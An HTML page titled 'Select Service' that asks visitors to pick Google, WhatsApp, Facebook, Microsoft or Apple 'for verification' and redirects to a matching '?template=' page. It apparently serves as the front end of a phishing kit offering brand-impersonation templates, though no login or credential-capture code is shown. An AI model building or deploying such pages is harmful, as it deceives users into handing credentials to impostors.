<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select Service</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        .brand-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        .brand-btn {
            padding: 14px 10px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 600;
            font-size: 14px;
        }
        .brand-btn:hover {
            transform: scale(1.03);
        }
        .brand-btn.google:hover { border-color: #4285f4; background: #f0f7ff; }
        .brand-btn.whatsapp:hover { border-color: #25d366; background: #e8f5e9; }
        .brand-btn.facebook:hover { border-color: #1877f2; background: #e8f0fe; }
        .brand-btn.microsoft:hover { border-color: #00a4ef; background: #e6f3fb; }
        .brand-btn.apple:hover { border-color: #1a1a1a; background: #f5f5f5; }
        .brand-btn .icon { font-size: 24px; display: block; margin-bottom: 4px; }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 Select Service</h1>
    <p>Choose the service you want to use for verification</p>
    <div class="brand-grid">
        <button class="brand-btn google" onclick="selectTemplate('google')">
            <span class="icon">🔵</span> Google
        </button>
        <button class="brand-btn whatsapp" onclick="selectTemplate('whatsapp')">
            <span class="icon">💬</span> WhatsApp
        </button>
        <button class="brand-btn facebook" onclick="selectTemplate('facebook')">
            <span class="icon">🔷</span> Facebook
        </button>
        <button class="brand-btn microsoft" onclick="selectTemplate('microsoft')">
            <span class="icon">⬡</span> Microsoft
        </button>
        <button class="brand-btn apple" onclick="selectTemplate('apple')" style="grid-column: span 2;">
            <span class="icon"></span> Apple
        </button>
    </div>
    <div class="footer">Choose a service to continue</div>
</div>

<script>
    function selectTemplate(template) {
        window.location.href = '/?template=' + template;
    }
</script>
</body>
</html>
